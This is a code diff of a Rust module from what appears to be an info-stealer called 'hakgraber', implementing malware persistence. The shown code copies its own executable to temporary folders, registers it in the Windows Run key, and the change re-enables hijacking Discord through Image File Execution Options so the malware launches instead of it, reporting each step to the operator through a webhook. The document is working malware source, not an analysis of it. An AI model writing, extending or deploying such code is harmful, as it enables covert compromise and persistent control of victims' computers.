@@ -5,22 +5,22 @@ use std::path::PathBuf;
 use winreg::enums::*;
 use winreg::RegKey;
 
-pub fn execute_extra_persistence() {
+pub fn _execute_extra_persistence() {
     if !is_elevated() {
         return; //not administrator, so we can't do extra persistence
     }
 
-    let temp_dir_path = copy_to_temp_dir();
+    let temp_dir_path = _copy_to_temp_dir();
     if temp_dir_path == None {
         return; //probably already did persistence stuff
     }
 
     let temp_dir_path = temp_dir_path.unwrap();
     _add_to_startup(&temp_dir_path);
-    //ifeo_discord(&temp_dir_path); problem with this is it blocks discord completely
+    _ifeo_discord(&temp_dir_path); //problem with this is it blocks discord completely, and this file runs instead of discord
 }
 
-fn copy_to_temp_dir() -> Option<PathBuf> {
+fn _copy_to_temp_dir() -> Option<PathBuf> {
     //copy local exe to %appdata%, %temp%, etc
     //maybe return the paths it has been copied to
     let local_path = std::env::current_exe().expect("unable to get local directory");
@@ -40,17 +40,14 @@ fn _add_to_startup(path: &PathBuf) {
         .expect("failed to access Run key");
 
     let sv_result = run_key.set_value("hakgraber", &path.display().to_string());
-    if let Err(why) = sv_result {
-        //this part is failing for some reason
-        //println!("sv result error: ");
-        //println!("{}", why);
+    if let Err(_why) = sv_result {
         return;
     }
 
     network::send_webhook_message("installed basic persistence");
 }
 
-fn ifeo_discord(path: &PathBuf) {
+fn _ifeo_discord(path: &PathBuf) {
     let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE)
         .open_subkey(
             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
